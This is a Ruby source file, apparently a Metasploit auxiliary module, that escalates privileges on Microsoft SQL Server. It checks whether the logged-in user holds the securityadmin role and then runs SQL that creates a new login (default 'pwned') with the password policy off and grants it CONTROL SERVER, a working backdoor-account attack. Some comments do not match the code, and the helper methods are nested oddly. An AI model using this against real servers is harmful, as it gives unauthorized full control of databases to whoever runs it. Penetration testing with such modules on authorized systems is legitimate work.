##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::MSSQL
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Microsoft SQL Server Security Admin Priv Esc',
      'Description'    => %q{
          This module will check to see if the given user has security admin privileges
          and if so, then attempt to privilege escalate by creating a new user.
      },
      'Author'         => [ 'Atthacks - https://atthacks.com' ],
      'License'        => MSF_LICENSE,
      'DefaultOptions' => {
        'CREATE_USER' => 'pwned',
        'CREATE_PASSWORD' => 'ThanksForComing!',
      },
    ))
    register_options(
      [
        OptString.new('CREATE_USER', [ true, "Default: pwned", "",]),
        OptString.new('CREATE_PASSWORD', [ true, "Default: ThanksForComing!", "" ])
      ])
  end

  def run
    print_status("Running MS SQL Server Security Admin Escalation...")

    if !mssql_login_datastore
      print_error("Login was unsuccessful. Check your credentials.")
      disconnect
      return
    end

  # Checks if user is already sysadmin
  def check_secadmin
    # Setup query to check for sysadmin
    sql = "select is_srvrolemember('securityadmin') as IsSecAdmin"

    # Run query
    result = mssql_query(sql)

    # Parse query results
    parse_results = result[:rows]
    status = parse_results[0][0]

    # Return status
    return status
  end

  # Gets trusted databases owned by sysadmins
  def attempt_escalation
    # Setup query
    sql = "create login #{datastore['CREATE_USER']} with password='#{datastore['CREATE_PASSWORD']}', check_policy=off; grant control server to [#{datastore['CREATE_USER']}];"

    result = mssql_query(sql)

    # Return on success
    return result[:rows]
  end

    user_status = check_secadmin

    if user_status == 1
      print_good("#{datastore['USERNAME']} has the security admin role, attempting to escalate.")
      attempt_escalation
      print_good("Please try and log in with user '#{datastore['CREATE_USER']}' and password '#{datastore['CREATE_PASSWORD']}'")

      disconnect
      return
    else
      print_status("You're NOT a security admin.")
    end

    disconnect
  end
end
